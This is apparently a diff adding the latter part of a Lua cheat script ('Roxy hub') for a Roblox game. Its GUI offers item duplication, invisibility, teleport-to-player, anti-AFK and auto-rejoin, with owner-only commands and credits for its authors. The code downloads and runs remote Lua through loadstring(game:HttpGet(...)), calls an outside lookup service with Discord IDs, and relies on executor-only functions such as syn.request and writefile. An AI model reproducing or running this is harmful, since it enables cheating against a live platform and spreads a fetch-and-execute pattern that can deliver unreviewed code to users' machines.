+            _G.ANTIAFK = true
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Proxylol/OtherScripts/main/AntiAfk.lua'),true))()
+            if game:GetService("CoreGui"):WaitForChild("AntiAfk").Enabled == true then
+            game:GetService("CoreGui"):WaitForChild("AntiAfk").Enabled = false
+            game:GetService("CoreGui"):WaitForChild("AntiAfk").Name = randomstring()
+            end
+            GUI:Notify({
+                Title = "Note",
+                Content = "Done.!",
+                Duration = 6.2,
+            })
+        else
+            GUI:Notify({
+                Title = "Note",
+                Content = "Don't press it 2 time's bro (saved you from crashing)",
+                Duration = 6.2,
+            }) 
+        end
+    end,
+})
+
+local Toggle2565 = misc:CreateToggle({
+    Name = "auto antiafk / عدم الطرد تلقائي",
+    CurrentValue = false,
+    Flag = "autoanti",
+    Callback = function(autoanti)
+        if _G.ANTIAFK == false then
+            _G.ANTIAFK = true
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Proxylol/OtherScripts/main/AntiAfk.lua'),true))()
+            if game:GetService("CoreGui"):WaitForChild("AntiAfk").Enabled == true then
+            game:GetService("CoreGui"):WaitForChild("AntiAfk").Enabled = false
+            game:GetService("CoreGui"):WaitForChild("AntiAfk").Name = randomstring()
+            end
+            GUI:Notify({
+                Title = "Note",
+                Content = "Done.!",
+                Duration = 6.2,
+            })
+        end
+    end,
+ })
+
+local Button3 = misc:CreateButton({
+    Name = "Auto Rejoin / الدخول الا العبه مجددا تلقائي",
+    Callback = function()
+        GUI:Notify({
+            Title = "Are you sure?",
+            Content = "this cannot be undone",
+            Duration = 6.5,
+            Actions = { 
+                Button2 = {
+                    Name = "no im not",
+                    Callback = function()
+                        GUI:Notify({
+                            Title = "",
+                            Content = "alright..",
+                            Duration = 2,
+                        })
+                    end
+                },
+                Button1 = {
+                    Name = "yes im sure",
+                    Callback = function()
+                        repeat wait() until game.CoreGui:FindFirstChild('RobloxPromptGui')
+ 
+                        local po,ts = game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService')
+                         
+                        po.ChildAdded:connect(function(a)
+                            if a.Name == 'ErrorPrompt' then
+                                repeat
+                                    ts:Teleport(game.PlaceId)
+                                    wait(2)
+                                until false
+                            end
+                        end)
+                        GUI:Notify({
+                            Title = "Note",
+                            Content = "auto Rejoin is Active",
+                            Duration = 5.2,
+                        })
+                    end
+                },
+            },
+        })
+    end,
+})
+
+local Toggle6= misc:CreateToggle({
+    Name = "Auto auto rejoin / الدخول الا العبه مجددا تلقائي",
+    CurrentValue = false,
+    Flag = "autrje", 
+    Callback = function(autrje)
+        repeat wait() until game.CoreGui:FindFirstChild('RobloxPromptGui')
+ 
+        local po,ts = game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService')
+         
+        po.ChildAdded:connect(function(a)
+            if a.Name == 'ErrorPrompt' then
+                repeat
+                    ts:Teleport(game.PlaceId)
+                    wait(2)
+                until false
+            end
+        end)
+        GUI:Notify({
+            Title = "Note",
+            Content = "Done.!",
+            Duration = 6.2,
+        })
+    end,
+ })
+
+local Button4 = misc:CreateButton({
+    Name = "Rejoin / دخول العبه مجددا",
+    Callback = function()
+        GUI:Notify({
+            Title = "Note",
+            Content = "Rejoinning..",
+            Duration = 2,
+        })
+        wait(0.2)
+        game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+    end,
+})
+
+local Button4 = misc:CreateButton({
+    Name = "Destroy Roxy hub / احذف القائمه",
+    Callback = function()
+        GUI:Destroy()
+    end,
+})
+
+local Paragraph = misc:CreateParagraph({Title = "Cmds / اوامر", Content = "dupe(ينسخ راديو), invisb (يخلي الراديوو مخفي), equip(يمسك جميع الراديوهات), goto(يذهب الا الاعب), demesh(راديو حجر), prefix"})
+
+local Input = misc:CreateInput({
+    Name = "cmd prefix",
+    PlaceholderText = "'!' is default",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(pref)
+        Prefix = pref
+    end,
+})
+
+if plr.Name == "dream0_77777777777" or plr.Name == "makram12345" then
+    local Section = misc:CreateSection("this is visble for owner's only")
+    local Input2 = misc:CreateInput({
+        Name = "owner cmd prefix",
+        PlaceholderText = "'+' is default",
+        RemoveTextAfterFocusLost = false,
+        Callback = function(opref)
+            oprefix = opref
+        end,
+    })
+end
+
+local credits = UI:CreateTab("Credits", 12210550648)
+
+local Section = credits:CreateSection("this Hub Was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط")
+
+local request = request or http_request or syn and syn.request
+
+local discorduserid = "1017157118878564514"
+local discord
+
+local response = request({
+	Url = "https://lookupguru.herokuapp.com/lookup",
+	Method = "POST",
+	Headers = { ["Content-Type"] = "application/json" },
+	Body = game:GetService("HttpService"):JSONEncode({ ["input"] = discorduserid }),
+})
+response = game:GetService("HttpService"):JSONDecode(response.Body)
+
+local s, r = pcall(function()
+	local discord = response.data.username .. "#" .. response.data.discriminator
+	return discord
+end)
+if s then
+	discord = r
+else
+	warn(r)
+end
+local Label = credits:CreateLabel("Discord for Khlat : " .. discord)
+local Button = credits:CreateButton({
+    Name = "Copy's Khlat's Discord",
+    Callback = function()
+        GUI:Notify({
+            Title = "Note",
+            Content = "Succesfull",
+            Duration = 4,
+        })
+        wait(0.2)
+        setclipboard(tostring(discord))
+    end,
+})
+
+local Label = credits:CreateLabel("Check Out Khlats Channel : kool_ere")
+local Button = credits:CreateButton({
+    Name = "Copyed khlat channel Link",
+    Callback = function()
+        GUI:Notify({
+            Title = "Sub and like!!",
+            Content = "Succesfull",
+            Duration = 4,
+        })
+        wait(0.2)
+        setclipboard(tostring("https://www.youtube.com/@kool_ere"))
+    end,
+})
+
+local Label = credits:CreateLabel("Roblox Account for Khlat : dream0_77777777777")
+local Button = credits:CreateButton({
+    Name = "Copy's Khlat's Roblox User",
+    Callback = function()
+        GUI:Notify({
+            Title = "Note",
+            Content = "Succesfull",
+            Duration = 4,
+        })
+        wait(0.2)
+        setclipboard(tostring("dream0_77777777777"))
+    end,
+})
+
+local discorduserid = "983015524294361191"
+local discord1 
+
+local response = request({
+	Url = "https://lookupguru.herokuapp.com/lookup",
+	Method = "POST",
+	Headers = { ["Content-Type"] = "application/json" },
+	Body = game:GetService("HttpService"):JSONEncode({ ["input"] = discorduserid }),
+})
+response = game:GetService("HttpService"):JSONDecode(response.Body)
+
+local s, r = pcall(function()
+	local discord1 = response.data.username .. "#" .. response.data.discriminator
+	return discord1
+end)
+if s then
+	discord1 = r
+else
+	warn(r)
+end
+local Label = credits:CreateLabel("Discord for Makram : " .. discord1)
+local Button = credits:CreateButton({
+    Name = "Copy's Mkrm's Discord",
+    Callback = function()
+        GUI:Notify({
+            Title = "Note",
+            Content = "Succesfull",
+            Duration = 4,
+        })
+        wait(0.2)
+        setclipboard(tostring(discord1))
+    end,
+})
+
+local Label = credits:CreateLabel("Check Out Mkrms Channel : Mkrm Dacca")
+local Button = credits:CreateButton({
+    Name = "Copy's Mkrm's Channel's Link",
+    Callback = function()
+        GUI:Notify({
+            Title = "Sub and like!!",
+            Content = "Succesfull",
+            Duration = 4,
+        })
+        wait(0.2)
+        setclipboard(tostring("https://www.youtube.com/@mkrmdacca"))
+    end,
+})
+
+local Label = credits:CreateLabel("Roblox Account for Makram : makram12345")
+local Button = credits:CreateButton({
+    Name = "Copy's Mkrm's Roblox User",
+    Callback = function()
+        GUI:Notify({
+            Title = "Note",
+            Content = "Succesfull",
+            Duration = 4,
+        })
+        wait(0.2)
+        setclipboard(tostring("makram12345"))
+    end,
+})
+if plr.Name == "dream0_77777777777" then
+local onlykhlat = UI:CreateTab("khlat and khlat only")
+local Section = onlykhlat:CreateSection("ONLY FOR KHLAT HOW DID YOU GET IN???????!")
+local Button = onlykhlat:CreateButton({
+    Name = "khlat boombox pos (legendry)",
+    Callback = function()
+        GUI:Notify({
+            Title = "Note",
+            Content = "يا حمار لازم يكون عندك 32 راديو",
+            Duration = 4,
+        })
+        wait(0.2)
+        --[khlat راديو]--
+        local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
+        local Tools = plr.Backpack[radio]
+        
+        Tools[1].Grip = CFrame.new(5, -8, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[1].Parent = plr.Character
+
+        Tools[2].Grip = CFrame.new(7, -8, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[2].Parent = plr.Character
+
+        Tools[3].Grip = CFrame.new(9, -8, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[3].Parent = plr.Character
+
+        Tools[4].Grip = CFrame.new(11, -8, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[4].Parent = plr.Character
+
+        Tools[5].Grip = CFrame.new(-9.6, 1, 0) * CFrame.Angles(0, math.rad(0),-1 ,0 ,0)
+        Tools[5].Parent = plr.Character
+
+        Tools[6].Grip = CFrame.new(-7.6, 1, 0) * CFrame.Angles(0, math.rad(0),-1 ,0 ,0)
+        Tools[6].Parent = plr.Character
+
+        Tools[7].Grip = CFrame.new(-2.5, 10.5, 0) * CFrame.Angles(0, math.rad(0),-2.3 ,0 ,0)
+        Tools[7].Parent = plr.Character
+
+        Tools[8].Grip = CFrame.new(-4.5, 10.5, 0) * CFrame.Angles(0, math.rad(0),-2.3 ,0 ,0)
+        Tools[8].Parent = plr.Character
+
+        Tools[9].Grip = CFrame.new(5, -2.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[9].Parent = plr.Character
+
+        Tools[10].Grip = CFrame.new(7, -2.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[10].Parent = plr.Character
+
+        Tools[11].Grip = CFrame.new(9, -2.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[11].Parent = plr.Character
+
+        Tools[12].Grip = CFrame.new(11, -2.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[12].Parent = plr.Character
+
+        Tools[13].Grip = CFrame.new(-1, 7.8, 0) * CFrame.Angles(0, math.rad(0),-2.9 ,0 ,0)
+        Tools[13].Parent = plr.Character
+
+        Tools[14].Grip = CFrame.new(6.5, 3, 0) * CFrame.Angles(0, math.rad(0),-4.4 ,0 ,0)
+        Tools[14].Parent = plr.Character
+
+        Tools[15].Grip = CFrame.new(4.5, 3, 0) * CFrame.Angles(0, math.rad(0),-4.4 ,0 ,0)
+        Tools[15].Parent = plr.Character
+
+        Tools[16].Grip = CFrame.new(5, 3.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[16].Parent = plr.Character
+
+        Tools[17].Grip = CFrame.new(7, 3.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[17].Parent = plr.Character
+
+        Tools[18].Grip = CFrame.new(9, 3.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[18].Parent = plr.Character
+
+        Tools[19].Grip = CFrame.new(11, 3.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[19].Parent = plr.Character
+
+        Tools[20].Grip = CFrame.new(5, 9, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[20].Parent = plr.Character
+
+        Tools[21].Grip = CFrame.new(7, 9, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[21].Parent = plr.Character
+
+        Tools[22].Grip = CFrame.new(9, 9, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[22].Parent = plr.Character
+
+        Tools[23].Grip = CFrame.new(-12, 2, 0) * CFrame.Angles(0, math.rad(0), 10.1)
+        Tools[23].Parent = plr.Character
+
+        Tools[24].Grip = CFrame.new(-10, -2.5, 0) * CFrame.Angles(0, math.rad(0), 10.5)
+        Tools[24].Parent = plr.Character
+
+        Tools[25].Grip = CFrame.new(-6, -6.5, 0) * CFrame.Angles(0, math.rad(0), 11)
+        Tools[25].Parent = plr.Character
+
+        Tools[26].Grip = CFrame.new(-5.7, 7.5, 0) * CFrame.Angles(0, math.rad(0), 9.1)
+        Tools[26].Parent = plr.Character
+
+        Tools[27].Grip = CFrame.new(5, 12.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[27].Parent = plr.Character
+
+        Tools[28].Grip = CFrame.new(7, 12.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[28].Parent = plr.Character
+
+        Tools[29].Grip = CFrame.new(9, 12.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[29].Parent = plr.Character
+
+        Tools[30].Grip = CFrame.new(11, 12.5, 0) * CFrame.Angles(0, math.rad(0), 14.1)
+        Tools[30].Parent = plr.Character
+
+        Tools[31].Grip = CFrame.new(10.7, -10, 0) * CFrame.Angles(0, math.rad(0), 12.5)
+        Tools[31].Parent = plr.Character
+
+        Tools[32].Grip = CFrame.new(13.7, -10, 0) * CFrame.Angles(0, math.rad(0), 12.5)
+        Tools[32].Parent = plr.Character
+
+    end,
+})
+local Paragraph = onlykhlat:CreateParagraph({Title = "Owner Cmds", Content = " prefix is: + soon.."})
+elseif plr.Name == "makram12345" then
+    local onlymkrm = UI:CreateTab("mkrm and mkrm only")
+    local Section = onlymkrm:CreateSection("ONLY FOR MKRM HOW DID YOU GET IN???????!")
+    local Button = onlymkrm:CreateButton({
+        Name = "TEST",
+        Callback = function()
+            GUI:Notify({
+                Title = "Note",
+                Content = "Testing",
+                Duration = 4,
+            })
+            wait(0.2)
+        end,
+    })
+    local Paragraph = onlymkrm:CreateParagraph({Title = "Owner Cmds", Content = " prefix is: + soon"})
+end
+spawn(function ()
+    plr.Chatted:connect(function(msg)
+        if plr.Name == "dream0_77777777777" or plr.Name == "makram12345" then
+            local low = string.lower(msg)
+            local args = string.split(msg, " ")
+            if args[1] == oprefix .. "demesh" then
+                Mesh()
+            end
+            if args[1] == oprefix .. "rj" then
+                GUI:Notify({
+                    Title = "Note",
+                    Content = "Rejoinning..",
+                    Duration = 2,
+                })
+                wait(0.2)
+                game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+            end
+            if args[1] == oprefix .. "invisb" then
+                invisb()
+            end
+            if args[1] == oprefix .. "goto" then
+                local player = getPlayer(args[2], plr)
+                plr.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + CFrame.new(0, 0, -3)
+            end
+            if args[1] == oprefix .. "equip" then
+            Equip()
+            end
+            if args[1] == oprefix .. "dupe" then
+                wait(0.2)
+                Dupe(tonumber(args[2]))
+            end
+            if args[1] == oprefix .. "prefix" then
+                oprefix = args[2]
+            end
+        end
+    end)
+end)
+spawn(function ()
+    plr.Chatted:connect(function(msg)
+        local low = string.lower(msg)
+        local args = string.split(msg, " ")
+        if args[1] == Prefix .. "demesh" then
+            Mesh()
+        end
+        if args[1] == Prefix .. "invisb" then
+            invisb()
+        end
+        if args[1] == Prefix .. "rj" then
+            GUI:Notify({
+                Title = "Note",
+                Content = "Rejoinning..",
+                Duration = 2,
+            })
+            wait(0.2)
+            game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+        end
+        if args[1] == Prefix .. "goto" then
+            for i, v in pairs(getPlayer(args[2], plr)) do
+                plr.Character:MoveTo(v.Character.HumanoidRootPart.Position + Vector3.new(0, 0, -3))
+            end
+        end
+        if args[1] == Prefix .. "equip" then
+        Equip()
+        end
+        if args[1] == Prefix .. "dupe" then
+            Dupe(tonumber(args[2]))
+        end
+        if args[1] == Prefix .. "prefix" then
+            writefile("config.vh", JSONEncode({
+                ["Prefix"] = args[2]
+            }))
+            Prefix = args[2]
+        end
+    end)
+end)
+_G.JOIK = false
+spawn(function ()
+    game.Workspace.ChildAdded:Connect(function(nnamee)
+        if _G.JOIK == true then
+            return end;
+            if nnamee.Name == "dream0_77777777777" then
+                GUI:Notify({
+                    Title = "A DEVELOPER JOINED YOU!!",
+                    Content = "KHLAT JOINED YOU!!!",
+                    Duration = 40,
+                })
+                _G.JOIK = true
+            end
+    end)
+end)
+
+_G.JOIM = false
+spawn(function ()
+    game.Workspace.ChildAdded:Connect(function(namee)
+        if _G.JOIM == true then
+            return end;
+            if namee.Name == "makram12345" then
+                GUI:Notify({
+                    Title = "A DEVELOPER JOINED YOU!!",
+                    Content = "MKRM JOINED YOU!!!",
+                    Duration = 40,
+                })
+                _G.JOIM = true
+            end
+    end)
+end)
+
+spawn(function ()
+    while _G.JOIK == false do
+        for i,v in pairs(Players:GetChildren()) do
+            if v.Name == "dream0_77777777777" or v.Name == "[⚠] dream0_77777777777" then
+                GUI:Notify({
+                    Title = "A DEVELOPER IS WITH YOU!!",
+                    Content = "KHLAT IS WITH YOU INGAME!!!",
+                    Duration = 40,
+                })
+                _G.JOIK = true
+            end
+        end
+        wait(1.2)
+    end
+end)
+
+spawn(function ()
+    while _G.JOIM == false do
+        for i,v in pairs(Players:GetChildren()) do
+            if v.Name == "makram12345" or v.Name == "[⚠] makram12345" then
+                GUI:Notify({
+                    Title = "A DEVELOPER IS WITH YOU!!",
+                    Content = "MKRM IS WITH YOU INGAME!!!",
+                    Duration = 40,
+                })
+                _G.JOIM = true
+            end
+        end
+        wait(1.2)
+    end
+end)
+_G.JOID = false
+spawn(function ()
+    while _G.JOID == false do
+        for i,v in pairs(Players:GetChildren()) do
+            if v.Name == "m_eui" or v.Name == "[⚠] m_eui" then
+                GUI:Notify({
+                    Title = "A DEVELOPER IS WITH YOU!!",
+                    Content = "D7ME IS WITH YOU INGAME!!!",
+                    Duration = 40,
+                })
+                _G.JOIM = true
+            end
+        end
+        wait(1.2)
+    end
+end)
+spawn(function ()
+    game.Workspace.ChildAdded:Connect(function(nammee)
+        if _G.JOID == true then
+            return end;
+            if nammee.Name == "m_eui" or nammee.Name == "[⚠] m_eui" then
+                GUI:Notify({
+                    Title = "A DEVELOPER JOINED YOU!!",
+                    Content = "D7ME JOINED YOU!!!",
+                    Duration = 40,
+                })
+                _G.JOID = true
+            end
+    end)
+end)
+
+
+spawn(function ()
+    while _G.JOIK == true do
+        if game:GetService("Players"):FindFirstChild("dream0_77777777777") then
+            local owner = game:GetService("Players"):FindFirstChild("dream0_77777777777")
+            local dis = owner.DisplayName
+            local oname = owner.Name
+            dis = "[⚠] " .. oname
+        end
+        wait(5)
+    end
+end)
+
+spawn(function ()
+    while _G.JOID == true do
+        if game:GetService("Players"):FindFirstChild("m_eui") then
+            local owner = game:GetService("Players"):FindFirstChild("m_eui")
+            local dis = owner.DisplayName
+            local oname = owner.Name
+            dis = "[⚠] " .. oname
+        end
+        wait(5)
+    end
+end)
+
+spawn(function ()
+    while _G.JOIM == true do
+        if game:GetService("Players"):FindFirstChild("makram12345") then
+            local owner = game:GetService("Players"):FindFirstChild("makram12345")
+            local dis = owner.DisplayName
+            local oname = owner.Name
+            dis = "[⚠] " .. oname
+        end
+        wait(5)
+    end
+end)
+GUI:LoadConfiguration()
+end
